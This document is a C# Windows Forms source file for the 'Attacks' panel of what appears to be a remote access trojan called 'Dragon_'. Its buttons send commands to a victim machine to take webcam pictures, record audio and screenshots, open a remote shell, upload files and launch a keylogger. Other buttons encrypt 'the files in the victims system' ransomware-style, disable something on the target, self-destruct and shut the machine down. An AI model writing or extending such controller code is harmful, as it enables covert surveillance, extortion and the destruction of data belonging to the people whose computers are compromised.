using System;
using System.Buffers.Text;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Dragon_
{

    public partial class Attacks : Form
    {
        public Attacks()
        {
            InitializeComponent();
            label1.Text = "Current User Chosen: " + Program.AppState.CurrentUser;
        }

        private void Attacks_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            Program.hh.SendCommand("getcpu", Program.AppState.CurrentUser);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Program.hh.SendCommand("getram", Program.AppState.CurrentUser);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Program.hh.SendCommand("networkinfo", Program.AppState.CurrentUser);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            Program.hh.SendCommand("listpr", Program.AppState.CurrentUser);
        }

        private void button6_Click(object sender, EventArgs e)
        {
            Program.hh.SendCommand("webcam", Program.AppState.CurrentUser);
            Program.Log("Took a Picture of the Client");
        }

        private void button7_Click(object sender, EventArgs e)
        {
            CmdLine c = new CmdLine();
            c.Show();
        }

        private void button8_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Choose a file to upload (max 10 MB).", "Upload");

            using (OpenFileDialog dlg = new OpenFileDialog())
            {
                dlg.Title = "Select a file";
                dlg.Multiselect = false;

                if (dlg.ShowDialog() != DialogResult.OK)
                    return;

                FileInfo file = new FileInfo(dlg.FileName);

                if (file.Length > 10 * 1024 * 1024)
                {
                    MessageBox.Show("File must be under 10 MB.");
                    return;
                }

                byte[] bytes = File.ReadAllBytes(file.FullName);
                string base64 = file.Name + "|" + Convert.ToBase64String(bytes);
                Program.hh.SendCommand($"fileupload={base64}", Program.AppState.CurrentUser);
                Program.Log("Uploaded a file on the clients PC");

            }
        }

        private void button9_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Currently there is no option to manually show you the filepaths of the Client, but you can still search them thru the CMD, so do that here please", "Info");

            CmdLine c = new CmdLine();
            c.Show();
        }

        private void button10_Click(object sender, EventArgs e)
        {
            Program.hh.SendCommand("recaudio", Program.AppState.CurrentUser);
            Program.Log("Recorded audo on the Clients PC");
        }

        private void button11_Click(object sender, EventArgs e)
        {
            Program.hh.SendCommand("screenshot", Program.AppState.CurrentUser);
            Program.Log("Took a screenshot of the Clients PC");
        }

        private void button16_Click(object sender, EventArgs e)
        {
            AskData askData = new AskData();
            askData.Show();
        }

        private void button20_Click(object sender, EventArgs e)
        {
            AskData2 askData2 = new AskData2();
            askData2.Show();
        }

        private void button13_Click(object sender, EventArgs e)
        {
            AskData3 askData3 = new AskData3();
            askData3.Show();
        }

        private void button12_Click(object sender, EventArgs e)
        {
            KLogger k = new KLogger();
            k.Show();
        }

        private void button14_Click(object sender, EventArgs e)
        {
            var v = MessageBox.Show("Are you sure you want to Encrypt the files in the victims system?", "Warning", MessageBoxButtons.YesNo);
            if (v == DialogResult.Yes)
            {
                Program.hh.SendCommand("encrypt", Program.AppState.CurrentUser);
            }
            else
            {

            }

        }

        private void button15_Click(object sender, EventArgs e)
        {
            DecryptForm a = new DecryptForm();
            a.Show();
        }

        private void button18_Click(object sender, EventArgs e)
        {
            Program.hh.SendCommand("selfd", Program.AppState.CurrentUser);
        }

        private void button17_Click(object sender, EventArgs e)
        {
            Program.hh.SendCommand("disables", Program.AppState.CurrentUser);
        }

        private void button19_Click(object sender, EventArgs e)
        {
            MessageBox.Show(
    "Currently, this button is not functional. Sending live data through UDP is not practical. This feature may be added in a future version.",
    "Info"
); ;

        }

        private void button5_Click(object sender, EventArgs e)
        {
            Program.hh.SendCommand("shutdown", Program.AppState.CurrentUser);
            Program.Log("Shutdown Clients PC");
        }
    }
}
